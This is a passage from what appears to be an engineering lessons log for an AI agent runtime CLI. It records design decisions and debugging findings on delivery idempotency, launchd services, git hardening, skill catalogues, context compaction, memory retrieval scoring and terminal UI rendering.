  poll loop that awaited a 90-second turn is a bot that is deaf for 90 seconds.
- **`TurnStreams.attach` does not create a buffer, and must not learn to.** A caller that starts a
  turn and attaches in the next statement arrives before the first event, so it calls `open(turnId)`
  first. Creating one inside `attach` would make a typo'd turn id indistinguishable from a real one
  and leave the client tailing an empty stream forever.
- **`GET /v1/agents/:id/context` calls `Agent.previewContext`, which calls `assembleContext` with
  the same arguments `send` does.** A server that rebuilt the argument list would answer a question
  about a prompt nothing uses, and would drift the first time a slot moved.
- **A delivery's identity is derived, never generated, and the recipient is part of it.** A UUID at
  enqueue dedupes the outbox against itself — a problem it does not have. The duplicate that happens
  is the *enqueuer* running twice, and only a key both runs can recompute collides. Chunking
  therefore happens at enqueue, not at send: re-splitting later against a different
  `maxMessageChars` produces different keys for the same reply and the collision stops happening.
- **`node:sqlite` truncates a bound string at a NUL byte; `bun:sqlite` stores it whole.** An outbox
  group key built with a NUL separator round-tripped as `tg%3A1` under Node, matched no rows, and
  abandoned no chunks — no error, on one runtime out of two, and `grep` would not even search the
  file because it read as binary. Anything used as a *key* must be printable ASCII. It is row seven
  in `sqlite/driver.ts`'s table and is documented rather than normalised: a NUL in message content
  is still truncated under Node, deliberately, because escaping every bound string on the hot path
  is the wrong price for a byte chat text does not contain.
- **Every timestamp the outbox writes comes from the caller's clock.** `markRetry` always took an
  explicit `nextAttemptAt`; `enqueue` and `recoverInflight` stamped the wall clock while the engine
  asked `due` with an injected one. It never failed — it made tests pass or fail depending on the
  time of day, which for a queue whose whole contract is time is the worst available outcome.
- **Exactly-once is stated per crash point, never as one claim.** Before enqueue, before claim, and
  after `markSent` are all held. The window between the bytes leaving and the acknowledgement
  arriving cannot be closed without the provider deduplicating on a key we supply, which Telegram's
  `sendMessage` has no parameter for. `ChannelLimits.idempotentSend` says which kind of channel it
  is; a recovered row is re-sent, flagged `uncertain`, and that flag rides onto `delivery.sent` so a
  duplicate stays explicable afterwards. Setting the flag true without provider support turns a
  visible ambiguity into a silent duplicate, which is worse.
- **A failed chunk abandons the rest of its message.** `due` withholds any chunk whose predecessor
  is not `sent` — including one that is `failed`, which is the fail-closed direction. Half a message
  reaches a reader with nothing saying the rest is missing. The cascade is one count on one
  `delivery.failed`, because there was one fault.
- **Composio's published reference and its live API disagree, and the live one wins.** The docs
  describe a `summary` with `active_connections`; the response has `{message, results}` and no
  `summary`, with the link at `results.<toolkit>.redirect_url`. A renderer written to the docs
  reports "no link" on a call that returned one — a failure shaped like success. Same lesson one
  layer down: the workbench argument is `code_to_execute`, undocumented, and `code` came back
  "Validation error". Read a field first, walk as a fallback, and verify against the endpoint.

- **Two handlers for one signal means the destructive one wins.** `installGuards` answered SIGTERM
  with `finishNow(EXIT_SIGTERM)` while `serve` registered its own graceful handler; both fired,
  the hard exit won, and `runtime.stop()` never completed — no outbox flush, no clean store close,
  no `provider.stop()`, which is the only reaper for backgrounded `exec` children. Invisible for
  three phases because ctrl-C sends SIGINT, which the guard deliberately ignores, so every
  interactive stop took the right path; SIGTERM is the *only* path a service manager uses. The
  shutdown belongs in the `onExit` teardown list that `finish()` already awaits, and `claimSignals`
  yields the exit code too — a requested stop exits 0, because under `KeepAlive: {Crashed: true}`
  a non-zero exit tells the supervisor to stay down.
- **A fix to a rendering is not a fix to the fact it renders.** Decision 5.17 made slot 2 report
  state, and the *wiring* stayed wrong: `channelsStarted` came from `hub.statusOf(id).length > 0`,
  which is true under `run` as well, since a binding is registered either way and `start()` is what
  differs. So the agent was still being told its channel was connected in a session where nothing
  was listening. Found only by building `/status`, a second consumer of the same fact, and noticing
  the two agreed with each other and disagreed with reality. `hub.started` is the honest signal.
- **A good error message in a file nobody opens is a silent failure.** `~/.openclaw/logs/gateway.err.log`
  is 57 MB of one sentence that names its cause, carries a hint and offers two remedies, written
  every ten seconds for 2,463 restarts. Message quality was never the problem. This is why the
  restart limit is structural — `KeepAlive: {Crashed: true}`, so a configuration fault stops once —
  rather than "we will warn about it", and why `daemon status` exits non-zero and prints the stderr
  tail instead of reporting a stopped job as merely not running.
- **A service is only as durable as the paths baked into it, and `#!/usr/bin/env node` is not one.**
  launchd's PATH is `/usr/bin:/bin:/usr/sbin:/sbin`, which on a machine with a version manager
  contains no `node` — so the obvious plist naming the shim exits 127 forever, into a log nobody
  has been told about. Interpreter and script are both `realpath`'d and written absolutely, the
  manifest too (`resolveAgentRef` is cwd-relative, and launchd's cwd is `/`). Two warnings ride
  along because the paths *can* rot: a binary inside a git checkout, and an interpreter under nvm.
- **`launchctl print` echoes a job's environment in plaintext, so a plist carries no secret.**
  Enforced by a throw in `renderPlist` against a brand-derived allowlist, not by review — the cost
  of getting it wrong is a credential readable by every local process, with nothing about the
  running agent looking wrong. Corollary: `.env` beside the manifest is the *only* credential path
  under a service manager, which is why `init` writes it 0600.
- **`disable` persists across boots; `bootout` does not.** So `daemon stop` is disable + bootout, or
  the agent quietly comes back at the next login — and `install` must `enable` first, or a service
  that was once stopped installs cleanly and silently never starts. Modern verbs only: `bootstrap`,
  `bootout`, `kickstart -k`, `enable`, `disable`, `print`, `print-disabled`. And `launchctl list`'s
  status column is a raw wait status (`256` is exit 1) while `print`'s `last exit code` is already
  decoded — decoding the second turns a failure into a clean stop.
- **`RunAtLoad` starts it; `KeepAlive` starts it *again*.** `KeepAlive: {Crashed: true}` is the
  restart policy and answers nothing about launch, so a plist without `RunAtLoad` installs cleanly,
  runs all day, and silently never comes back at the next login — it loads and waits forever for a
  start condition it does not have. Only observable across a session boundary, which is the test
  easiest to skip. And **`loginwindow`'s pid is the proxy for whether that boundary happened**: every
  LaunchAgent lives in `gui/$UID`, which is torn down with it, so a surviving pid means nothing was
  ever asked to relaunch. `last` and `who` are no use here — they read the same whether a logout was
  cancelled or never attempted, and a logout requested from the terminal running the test cancels
  itself, because Terminal.app with a live child blocks it behind a dialog that times out in 60 s.
- **A stop switch consults two sources, because neither is complete.** `launchctl` knows about
  installed services and nothing about a `serve` started by hand; the lease table knows about any
  live process and nothing about a service that is installed but currently down. `stop` reads both,
  and reporting success while one of them is still running is the only failure it really has. It
  SIGTERMs before it kills — the graceful path is the only one that runs `provider.stop()` and reaps
  backgrounded `exec` children — and it disables as well as unloading, because a safety switch that
  comes back at the next login is not one.
- **A long-running process sets `process.title`, or it is an anonymous `node` in Activity Monitor.**
  `serve` names itself `<slug> <agentId>`, short enough to survive the 16-character `comm`
  truncation intact. The cost is real and worth stating: assigning the title overwrites the argv
  region, so `ps` shows the title instead of the command line — the arguments stay visible through
  `launchctl print` and `daemon status`. It does *not* change the code-signing identity, which is
  Node's, and only shipping our own signed binary would.
- **"Running" and "working" are different questions, and `status` has to answer the second.** A
  freshly installed bot was connected, healthy, and refusing every message from the one person it
  was set up for, because a handle in `allowFrom` had a hyphen where an underscore belonged. The
  refusal names the sender and the exact line to add — into a log file. It is not only *errors*
  that get written where nobody looks, which is the generalisation of the 57 MB lesson.
  `attentionFrom` reads the current run's stdout for up-and-not-working states; scope it to the
  run (slice at the last serving banner) or launchd's appending log reports a fixed problem
  forever.
- **Validate an identifier against the system that issues it, at the moment it is typed.** A
  Telegram username is `[A-Za-z0-9_]{5,32}`, so `@ada-lovelace` cannot exist and matching nobody is
  the only possible outcome. Everything downstream was correct behaviour applied to a wrong fact,
  which is the hardest kind of bug to see: nothing failed anywhere.
- **A lease row is a claim, not a fact, and a dead pid outranks a fresh heartbeat.** A boot that
  fails *after* claiming leaves a row seconds old with no process under it, which blocked every
  retry for ninety seconds while naming a pid that no longer existed — at the moment somebody was
  fixing the fault. Check `process.kill(pid, 0)` first; the heartbeat only settles pid reuse.
  Anything reading a lease to report state must re-check liveness for the same reason.
- **`git` waits for a credential prompt instead of failing, and did so for two minutes.** `git ls-remote
  https://github.com/github/skills` — a repository that does not exist — hung on a terminal nobody was
  watching, because a 404 on a private-or-absent repo is indistinguishable from "you are not logged in
  yet". Every invocation sets all four controls (`GIT_TERMINAL_PROMPT=0`, `GIT_ASKPASS`, `SSH_ASKPASS`,
  ssh `BatchMode=yes`) *and* runs under a wall-clock timeout, because any one left open is the hang.
  Never `GIT_CONFIG_NOSYSTEM`: it drops the credential helper, which is how a private source works.
  Related, and it cost a debugging round: **`timeout` is not a macOS command**, so a probe wrapped in it
  returns 127 for every repository and looks like a total failure.
- **A skill folder is not a leaf.** The catalogue scanner stopped descending at any directory holding a
  `SKILL.md`, to avoid reporting a skill's own `references/` as more skills. `github/awesome-copilot`
  nests skills inside skills — `qdrant-scaling` carries four, one three levels down — so the first real
  run found **410 of 425** and said nothing about the fifteen. Descend always: a false positive shows up
  in a listing where a person can see it, a false negative is a skill that does not exist as far as the
  tool is concerned. The general rule is the useful half — **when a scan of third-party layouts and a
  file count disagree, the scan is wrong until proven otherwise**, and both numbers belong in the output.
- **`lib/spawn.ts` is the only module in the CLI that may import `node:child_process`,** and it got there
  by *moving* rather than by the rule growing an allowlist. `lib/service.ts` held it for `launchctl`;
  `git` was a genuine second caller. An allowlist is what a one-module rule becomes the first time "add a
  caller" is an acceptable answer, and it grows once per phase. Tool-specific knowledge stays with the
  caller — `spawnCapture` returns `notFound` as a field rather than throwing, because a missing `git` and
  a missing `launchctl` need different sentences.
- **A fetch lands in `<name>.partial` and is renamed into place.** `sources update` re-clones rather than
  `fetch` + `reset --hard`, so there is one code path and no half-updated cache to reason about — and the
  rename is what makes a failed update leave the previous catalogue intact and searchable. An interrupted
  *first* fetch leaves no directory rather than an empty repo, which would read as a source with no
  skills in it. Measured: `--depth 1 --single-branch --filter=blob:none --sparse` plus `sparse-checkout
  set <path>` turns 100 MB of `awesome-copilot` into 22 MB in 9 s. Some servers refuse the filter, so a
  failure retries without it — a bigger download is never a failure.
- **A source's identity is a commit, and upstream moves under you.** Two clones of `anthropics/skills`
  twenty minutes apart returned `f6656c1` and `89dcaa3`, the second carrying a skill the first did not.
  So `.origins.json` records the commit beside the skill, `skills list` prints `anthropic@f6656c1`, and a
  count that differs between two runs is news about upstream rather than a bug — check the commit before
  debugging the scanner.
- **A command that undoes a mistake must not sit behind the load the mistake breaks.** `skills install`
  happily copied `skill-creator` (9,065 tokens, over `skills.budget`), which **fails the load** — so
  `list`, `validate` and every turn broke, and `remove`, the only command that could undo it, was behind
  the same `loadSkills` and broke too. Only hand-deleting the directory recovered. `install` checks the
  budget before copying; `new` and `remove` run before the catalogue loads at all, since one writes a
  directory and the other deletes one and neither needs to know what is in it.
- **`setInSource` replaces a key that exists and cannot append a new top-level one.** It never had to —
  every path `config_set` writes has a parent already in the file — so `skills new` on an agent with no
  `skills:` block printed a "here is what to add by hand" message, which is the workaround the command
  exists to remove. It now falls back to uncommenting the line the generated manifest already ships,
  which is that manifest's whole premise. Check the return value: `undefined` means it placed nothing.
- **The answer funnel in `init` is an object literal, so a step it does not list is silently dropped.**
  `--skills "pdf tables"` set the answer to `find` and lost the words; init then reported "no words to
  search for" about a phrase the person had typed one second earlier. No type error, because the return
  type's field is optional. This is the third time this exact shape has cost a debugging round —
  `apiKeyEnv` (whose comment says so), `ChatMessage.toolCalls`, `TurnInput.skills` — and the cheap guard
  is the same one every time: **a test at the end of the pipeline that reads the value out, not at the
  layer that sets it.**
- **A command that resolves a `<source>/<skill>` ref needs the sandbox env, or two callers consult two
  registries.** `skills install` called `loadSources()` with no override while `init` had just searched a
  sandbox, so the install reported `no source called test` for a source plainly in the list it had been
  handed. `SkillsOptions.sandboxEnv` is the `<ENVPREFIX>HOME` override and is **not** the manifest
  environment — that one is `ambientEnv` and answers "which model, which key". Two env concepts in one
  options object want two names.
- **Every manifest load during `init` has to tolerate the key it just wrote as an empty line.** The
  load check always stubbed it; the moment a *second* thing loaded the manifest during setup — installing
  a skill — it failed with `model.main.apiKeyEnv names MODEL_API_KEY, which is not set`: correct, and
  about a key nobody could have filled in yet. `envOverlay` carries the stub, hoisted out of the check
  block so both paths share one derivation.
- **A wizard option list's order and its fallback are different decisions, and separating them is what
  makes an expensive default safe.** The skills question lists "search the catalogues (~40 MB, once)"
  first, because pressing enter on a labelled cost is consent — and its `fallback` is `starter`, so
  `--yes` and every non-interactive run reach no network (measured: 0.13 s, no cache directory created).
  Write the fallback as a *name*, never `"1"`, or the two are the same thing forever. And a new text step
  needs a fallback that exists: an empty one makes enter-through stall, which is the one thing a default
  must never do — this one defaults to the purpose, and an empty phrase means "do not search" and says so.
- **`raw.githubusercontent.com` rate-limits, whatever a reference implementation says.** 26 parallel
  reads returned `429: Too Many Requests` with a 199-byte error body — and a catalogue built on that
  degrades to *silently partial*, which in a browse list is indistinguishable from a small catalogue.
  One `git clone --depth 1 --filter=blob:none --sparse` per source is atomic, cached, and works behind
  the user's own credential helper. When a transport's failure mode is "fewer results", prefer the one
  whose failure mode is "an error".
- **A spec limit that upstream violates is a warning, never a load failure.** `anthropics/skills`'
  `claude-api` carries a **1,068**-character description against the spec's 1,024, and `awesome-copilot`
  writes `allowed-tools` as a YAML list in six skills where the spec says string. Both were refusals, so
  both quietly dropped real skills — one of them Anthropic's own — for shapes that break nothing.
  **Refuse what the runtime cannot use; warn about what a different client might reject.** A list of
  scalars is joined for display and a *nested* one still fails, so nothing becomes `[object Object]`.
- **Space ticks, enter confirms — never the other way round.** Enter-on-a-highlighted-row is a strong
  enough habit that the reverse binding makes people submit with one item ticked and never discover the
  rest of the list. And a cursor must skip unselectable rows (group headings) in the direction it was
  moving, bounded by the row count: a cursor parked on a heading where enter does nothing reads as a
  broken keyboard, and an unbounded skip walk hangs the process on a list with no selectable rows.
- **A browse list and a search see different catalogues on purpose.** Curation is a recommendation, so
  it filters *browsing*; `sources search` reaches everything, because a search that could not find a
  skill somebody named would make curation a restriction. Two questions — "what should I look at" and
  "is this thing here" — and one filter applied in the wrong place answers neither.
- **Verify an allowlist against the remote by hand, and say so in the file.** 1 of 38 drafted curated
  names did not exist upstream, and a name that matches no folder is **silently absent** from the list
  rather than an error. The test asserts the list's *shape*, never the remote: a test that fetched would
  start failing when somebody else renames a directory, which is a fact about GitHub and not about this
  code.
- **When a pure module cannot host a screen, move the screen — not the question.** `init`'s skills step
  was implemented as a text box asking what the agent does often, because `nextQuestion` is a pure
  synchronous reducer over static option tables and a fetched list does not fit it. That is a true fact
  about the wizard and not a reason to ask a worse question: the catalogue picker existed in the same
  commit. The fix touches the reducer not at all — the answer stays a static three-way choice and `find`
  mounts the existing checklist *after* the files are written. Two sequential Ink mounts in one command is
  already the pattern `run` uses (picker, then the chat app).
- **A wizard answer that costs money or time gets its own screen, and its scripted twin needs a
  different mechanism.** `--skills "<phrase>"` survives as a flag-only answer precisely because a picker
  cannot run in CI, so the interactive path and the scripted path reach the same catalogue by different
  routes — and the step is removed from `STEP_ORDER` while staying in `InitAnswers`, which is how a
  flag-only answer is spelled here.
- **`skills` has no token budget, and must not grow one back.** `skills.budget` refused at install, at load
  and mid-turn, and its first real use turned eleven ticked skills into **"9 of 11 installed"** — `pptx` at
  5,441 tokens and `skill-creator` at 9,065 against a 5,000 default nobody chose. `maxActive` already bounds
  a turn to one body, so the second limit only ever converted the right procedure into no procedure. The
  replacement is **show the size where the choice is made**: every catalogue row prints its token count, and
  `skills validate` warns above the spec's advised 5,000. Same shape as `exec` having no `env` and
  `memory_write` no file argument — the field looks like protection and is a refusal.
- **A row that wraps is a broken list, and the width arithmetic belongs in a pure module.** Handing a name,
  a size and a full description to Ink in one `<Text>` wrapped every long row onto two or three lines and
  destroyed the checkbox alignment. `lib/rows.ts` clips each column, and **name and meta shrink before the
  description** — otherwise the fixed part of the row exceeds the terminal on its own (at 40 columns with a
  34-character name it came to 60, so every row wrapped whatever the description did). `wrap="truncate"` is
  a backstop, not a layout. Verify by character count, never with `awk`: `…` and `·` are multi-byte, so
  `length()` reports 69 overlong lines where there are none.
- **A blocking call under a renderer is not slow, it is broken.** `spawnSync` inside Ink froze the app: no
  spinner frame advanced *and* the keys pressed during a twenty-second clone were echoed by the tty instead
  of consumed, printing `^[[B^[[A` into the middle of the output. The fetch path is async throughout, and
  progress is reported through a **callback** — writing to stdout while Ink owns the frame paints over it.
- **A per-item report is right at one and wrong at eleven, so the caller decides.** Eleven ticked skills
  printed eleven `from / installed / this installed code / next` blocks, with 130 script paths inside them.
  `quiet` suppresses the narrative, `collect` returns what happened, and the batch prints one summary with a
  count and a pointer to `skills show`. Disclosure by count plus a way to see the names discloses *more*
  than 130 lines nobody reads.
- **"In the flow" means between two questions, not after the last one.** The catalogue was mounted after the
  wizard completed — questions, files written, then a list — and that is still a separate screen. It is an
  interlude in the wizard root now, and the pure reducer never changed: `nextQuestion` returns static options
  only, and the root holds the fetch and the selection because those are the two things a pure synchronous
  function cannot do. Trigger off the answer **log**, not `partialOf`, or a `--skills find` flag opens the
  picker before the first question.
- **A landing state is a collapsed header, not a second layout — and the brand's row *allowance* is not its
  *height*.** Three separately-reported chat bugs (`/exit` never showing its confirmation, `/help` and
  `/restart` wiping the landing screen) were one defect: two branches, so anything added to one was silently
  missing from the other and any transcript write swapped the whole branch out. There is now one frame whose
  wordmark collapses on the first message sent; palette, confirm line and composer are rendered once,
  unconditionally. The arithmetic trap sits next to it: `ChatFrame.brand` is what the mark is *permitted*,
  because the budget must be decided before anything is drawn, so the caller has to charge the conversation
  `mark.lines.length` via `transcriptRowsAfterBrand` — charging the allowance instead sent eleven rows nowhere
  on a 30-row terminal and scrolled the banner to a mid-wrap fragment while a third of the screen sat blank.
- **A handler that reads `editor.value` reads the buffer from *before* the submit.** `/restart` looked broken
  for a round: the runtime really did rebuild, and then the pre-submit closure carried `/restart` back into the
  new buffer and re-opened the palette over the fresh banner, so the screen looked untouched. Anything that
  survives a submit — a restart, a session switch — takes the **residual** buffer as an argument
  (`onSubmit(committed.text, committed.state.value)`), never the captured one.
- **`estimateTokens` runs 16–20% *low* on the prompts that matter, and its own file said the opposite for
  five phases.** Measured against a real endpoint over a session that fills with tool results
  (`evals/budget/`, deepseek-v4-pro, 31 turns): 14,057 estimated against 16,835 charged, because JSON and
  shell output split into more tokens per character than the 3.8 divisor assumes — and a session under
  compaction pressure is mostly tool results by definition. The error is in the **overflow** direction
  exactly when the window is tight. The divisor is deliberately not retuned: one constant cannot serve
  prose and JSON. `context/budget.ts` corrects it from the endpoint's own `prompt_tokens`, and the
  correction only works on a figure the endpoint actually *reported* — `StepResult.promptTokens` is seeded
  with the estimate, so feeding an unreported one back converges the ratio on exactly 1.0 and every
  accuracy check passes by construction. `promptTokensReported` is the guard.
- **`model.<role>.streamUsage` is off by default, so the anchor is dark unless a manifest turns it on.**
  Its own comment promised Phase 7 would need it, and turning it on for the first time found a bug that had
  shipped behind the unused flag: an OpenAI-compatible endpoint sends `"usage": null` on every chunk but
  the last, and the guard tested only for `undefined`. Verified live — a real deepseek session reports no
  usage, so `context.pressure` says `source: "estimated"` and carries the raw bias. Read the `source` field
  before trusting a pressure figure.
- **A compaction stage aims one rung *down*, and only the stages whose threshold is crossed may run.**
  Both obvious targets are wrong: getting just under the trigger lands on it and re-fires next turn, and a
  fixed comfortable level makes a 96% prompt destroy its way to 55%. Using the manifest's next-lower
  threshold gives hysteresis with no new constant. The consequence surprises tests: at high pressure the
  ladder often stops after `trim`, because `trim` reached the target — four tests failed asserting a digest
  had been written when the correct behaviour was not to write one. Forcing escalation needs a squeezed
  *history* budget (a large fixed part), not merely high pressure.
- **Compaction rewrites the prompt, never the store.** A resumed session re-reads the whole conversation
  and re-compacts it, so a turn whose pressure has fallen below `trim` shows a previously-snipped
  observation in full again. Verified live. That is the right direction — the store is the audit trail —
  but it means a pointer is not durable in the transcript and a test asserting "the marker is still there
  next turn" is asserting something false.
- **Every marker the runtime writes must carry what it takes to act on it, and a placeholder in a prompt is
  an instruction.** `snip`'s marker said an observation "is still readable with artifact_read" and named no
  id; a live model correctly reported there was no id to pass and answered from the visible fragment.
  Separately, `artifact_read`'s `whenToUse` showed `artifact_read("…")` — the same shape that made
  qwen3.5:9b write `value: <the value>` and score NLT at 27% against native's 92% — and the model kept
  insisting the id "cannot be guessed". Describe the field; never show a fake literal.
- **`toolContext()` is an object literal, so a new `ToolContext` field is silently dropped.** `readArtifact`
  was, and it is the fourth time: `apiKeyEnv`, `ChatMessage.toolCalls`, `TurnInput.skills`. A hand-built
  object is not excess-property-checked, so there is no type error — the guard is a test at the **far end**
  of the pipeline that reads the value out, which is how this one was caught within a minute of being written.
- **A gauge reports the state that resulted, not the state that triggered the response.** `context.pressure`
  first carried the pre-compaction figure and put `ctx 128%` on a status line for a session compaction had
  handled — true of a prompt nobody sent, and indistinguishable from an overflow. And the status line is
  truncated rather than wrapped, so *position* is load-bearing: a 100-column capture cut it mid-figure at
  `2564…`, which is why the gauge sits ahead of the turn stats.
- **The `stream_options` downgrade must not spend a retry attempt.** `streamUsage` is on by default since
  Phase 7A, and an endpoint refusing it is retried once without the field — but counting that against the
  retry budget made a single-attempt policy fall out of the loop with **no response at all**, returning an
  empty stream and reporting nothing. The match is on the field name in the response body, never on the
  status: a 400 is also what a malformed prompt returns, and retrying that hides a real error behind an
  extra request. Verified live on deepseek: turn one reports `source: "estimated"`, turn two onward
  `corrected` — and on a *prose* session the correction runs slightly **high**, the opposite direction from
  the observation-heavy eval, which is the whole reason the 3.8 divisor cannot be retuned to one constant.
- **A phase is per session; slot 2 is per agent and frozen. Never put the phase in slot 2.** It is the
  natural home for runtime state and the wrong one here: `#configSummary` is memoised per agent and
  frozen at first use because it sits in the cache-stable prefix (5.17), while a phase changes mid-turn —
  so two sessions in one process would render each other's phase, a wrong statement in the one block that
  exists to stop the runtime lying about its own state. The current phase lives in `phase_set`'s
  description, which is slot 1, already rebuilt per phase, and therefore cannot go stale or leak.
- **`let` where a closure reassigns it means TypeScript stops narrowing across an `await`, correctly.**
  `tools` became reassignable when `setPhase` landed, and every post-`await` use of it stopped being
  narrowed — which is the compiler pointing out that `phase_set` may have swapped the view in between.
  Optional-chain at the use site rather than re-narrowing: the registry wanted after an execution is
  whichever one resolved the call.
- **Ask what a *second* session would see.** That question caught the slot-2 phase bug before it shipped,
  and it generalises: anything memoised per agent — the config summary, the catalogue, the rendered
  workspace — is shared by every conversation that agent is having, so a per-session fact placed there is
  a leak rather than a staleness bug.
- **An NLT call block is `ACTION: <slug>`, not `ACTION` with a `tool:` field.** A test helper written the
  second way produced a turn with exactly one request and no tool call, because the block parsed as
  prose — and the failure looks identical to a model that declined to call anything. `PREAMBLE` in
  `nlt.ts` is the authority; a fixture that builds a block should be checked against it.
- **Phase scoping has a measured *cost*, and it lands on abstention.** `bun run eval:phases`, deepseek:
  87.5% full catalogue against 75.0% in a read-only `triage` phase, and every extra failure was in the
  `restraint` group — tasks whose right answer is to call nothing. One was a literal `phase_set` call on
  such a task, which names the cause: a narrow phase advertising more tools elsewhere reads as an
  instruction to move. Re-wording the refusal guidance did not recover it. This does not overturn
  decision 4.8 — that claim is about *small* models and a frontier arm can only show the cost side — but
  do not describe phases as free, and do not tune them against a frontier endpoint.
- **A hosted MoE at `temperature: 0` is not deterministic; a local endpoint was.** The identical `full`
  arm scored 21/24 then 20/24 on deepseek — 4.2pp between two runs of the same prompts. This repo records
  that two qwen runs were byte-identical and `--repeats` therefore measured nothing; remembering only
  that half turns "repeats cannot help" into a rule, and it is a fact about one endpoint. With n=24 and
  4pp of noise an 8pp delta is a signal to investigate, never a result.
- **A rename is one commit *in the tree* and three things *outside* it.** `scripts/rename-brand.ts`
  really does hold — the tree went to `dispach` with zero stragglers and 2,190 tests green — and it
  says nothing about the machine it was run on. launchd's `disable` **persists** while `bootout` does
  not, so deleting a plist leaves `<oldslug>.agent.<id> => disabled` in
  `/var/db/com.apple.xpc.launchd/` forever, and a future job with that label then installs cleanly,
  reports success and silently never starts; `launchctl enable` is what clears it, and no verb deletes
  the row. `~/.bun/bin/<oldslug>` keeps working *by symlink luck* through a scope directory
  (`@<oldslug>/cli`) that no longer names any package — so the old command runs and the new one does
  not exist, which reads as the rename having failed. And `~/.<oldslug>/` is orphaned rather than
  migrated, taking the sandbox, the store and the skills cache with it. Corollary: **rename with the
  script, never by hand.** The hand edit lowercased `CASTELLAN_API_TOKEN` to `dispach_API_TOKEN` and
  the display name to `dispach`, both of which the script's `/CASTELLAN/g` and title-case
  substitutions get right — and it left the etymology epigraph reading "a dispach holds and governs a
  keep", which no substitution can fix because it was a sentence about the *old* word's meaning.
- **A block whose slot is missing from `assembleContext`'s ordering list is built, charged for, and
  thrown away.** The output is composed from explicit `pinned.filter(b => b.slot === SLOT.x)` lines, so
  a new slot pushed into `pinned` but forgotten there costs prompt budget — it is counted in
  `pinnedTokens`, which takes room from the history — and reaches the model never. `SLOT.memory` was
  exactly that for a debugging round: retrieved, ranked, selected, billed, never sent, with slightly
  less history as the only symptom. There is now an invariant that throws naming the orphaned block.
- **`ToolRuntime` and `ToolContext` are both built with conditional spreads, so a field on the wrong
  one type-checks and lands nowhere.** `memoryDir` was declared on `ToolContext`, set on the
  *`ToolRuntime`* literal in `agent.ts`, and silently dropped — `memory_write` degraded to appending
  without eviction, with no error anywhere. That is the **fifth** time this shape has cost a round here
  (`apiKeyEnv`, `ChatMessage.toolCalls`, `TurnInput.skills`, `ToolContext.readArtifact`), and the guard
  is the same one every time: declare the field on every object that forwards it, and put one test at
  the *far end* that reads the value out of the request body.
- **`eviction: oldest` was declared vocabulary nothing consumed, and `memory_write` could brick the
  agent.** The workspace budget is a hard load failure by design, so ~200 saves took a freshly
  scaffolded agent to `workspace_budget_exceeded: MEMORY.md is 7843 tokens against its 2000-token
  budget` — the tool the agent is told to use for remembering, used enough, stopped it starting.
  Eviction moves **only top-level list items**; frontmatter, comments, headings and prose stay at their
  original bytes. And it is **gated on the declaration**, because `writeTarget` resolves the first
  writable `volatile` file and `init` lists `USER.md` first — without the gate, eviction would have
  deleted an author's hand-written prose about themselves into a dated archive.
- **The write target prefers a file declaring `eviction: oldest` over declared order, and the plain rule
  was wrong on the generated workspace.** `USER.md` before `MEMORY.md`, both writable, so every saved
  note went into the person's file — 1,500-token budget, no eviction, no intention of being trimmed —
  while the notes file was never touched. Found by running the real command against a real agent rather
  than by reading. The declaration *is* the author naming the target.
- **A memory corpus of near-identical notes retrieves nothing, and that is `discriminating()` working.**
  Any query term present in more than half the corpus is dropped as uninformative, so twelve notes that
  all say "the deploy pipeline waits for a manual approval gate" have no informative vocabulary at all.
  A test fixture hit this first and it read as "memory is broken". Corollary: **corpus composition
  changes the normalisation** — the same query scored 0.284 with `USER.md` in the corpus and 0.404
  without it, because a term's df decides whether it counts toward the denominator.
- **FTS5 supplies candidates, never the score.** `bm25()` computes its statistics over the whole table
  and one sandbox root has one store shared by every agent in it, so a corpus-wide average document
  length would make one agent's scores move when an unrelated agent saved a note. Scoring in
  `rank/bm25.ts` also makes FTS5's tokeniser irrelevant, which matters because `porter` stems
  differently from `stem()` and no built-in tokeniser applies a stopword list — scoring through
  `bm25()` would have made `skills.threshold` and `memory.threshold` two different floors wearing one
  number. What is indexed is `terms()` output, so the indexed column is **derived**: `TOKENISER_VERSION`
  is what turns a changed tokeniser into a rebuild instead of into silently worse retrieval.
- **`syncFiles` reconciles rather than adds.** A source present in the index and absent from `files` is
  dropped, so calling it with one file forgets every other source — correct for "here is the corpus",
  catastrophic for "here is one more file". The first test written against it made exactly that mistake,
  indexing five files one call at a time and finding four of them gone.
- **Do not claim a score improvement without measuring it.** Stripping the ISO stamp out of the indexed
  text looks like it must help — five junk terms beside six real ones — and it does not: every passage
  carries a stamp, so removing them moves each document's length and the corpus average together, and
  the measured change was **0.278 → 0.284**. The change is kept for the reasons that survive (a smaller
  index, a `length` that means what it says), and the docstring says so, because a false number in a
  comment outlives whoever guessed it.
- **A fake model that decides "have I already acted this turn?" from the prompt must key on the input,
  not on the tail.** `SLOT.input` is ordered *after* the history, so an observation is never the last
  message; and an observation stays in the history forever, so "does the prompt contain OBSERVATION" is
  true from the second turn onward. Both mistakes were made in one fixture and both presented as
  "eviction does not work" rather than as a broken test.
- **A memory query that reduces to *one* informative term scores a rare match as highly as the right
  one, and no threshold separates them.** The normalisation divides by `Σ idf` over the terms it sums, so
  with a single term idf cancels. Measured: "who won the 1998 world cup" reduces to `{1998}`, matches a
  filler note containing that number once, and scores **0.490** — above the genuine two-of-three match
  at **0.394**. Same shape as the skills collapse on `{the}` at 0.771, with the fix inverted: there the
  culprit was a *common* term and a stopword list removed it; here it is a term the corpus holds **once**,
  which idf calls maximally informative. Accepted because the cost differs by an order of magnitude — a
  wrong skill displaces the right one, a wrong memory spends twenty tokens — and because a rule refusing
  single-term queries would refuse "frankfurt?" too. Do not "fix" it with a constant; it is a property of
  a normalised score.
- **A bounded window that renders `wrap="truncate"` and wraps nothing is truncating, and Ink measures the
  box from its *content*.** `LineCursor` did both halves of that, so a long message made the composer wider
  than the terminal and the wrapping became whichever terminal was running it: at 100 columns VS Code cut
  the line at the border and took the caret with it — you could not see what you were typing — while Warp
  wrapped the over-wide row onto the right-hand border. One cause, two symptoms, neither reproducible in the
  other terminal, which is why it was reported as two bugs. Give a box an explicit `width` and wrap the text
  yourself. Two details that are not optional: the wrap has to report **source offsets**, because a row's
  text is not a slice of its line — a break consumes the space and a hanging indent is re-applied to rows
  that never held one — so a caret cannot be placed from the finished strings; and it wraps to `columns - 1`,
  because the caret is an inverse cell and needs a cell at the end of a row that exactly fills the window.
- **`ROLE_PREFIX` is a hanging indent, so a long label makes the longest item the narrowest.** The reasoning
  prefix was fourteen columns, re-applied to every row after the first, on the one item that is routinely
  forty rows long — 86 columns of a 100-column terminal. The label belongs on a row of its own. And a 23-row
  reasoning block for a one-sentence answer fills a thirty-row terminal on its own, so it folds to a count
  with ⌥r to open it: folding is applied when items become **rows**, never when they are committed, or
  `--show-reasoning` stops being honourable after the fact.
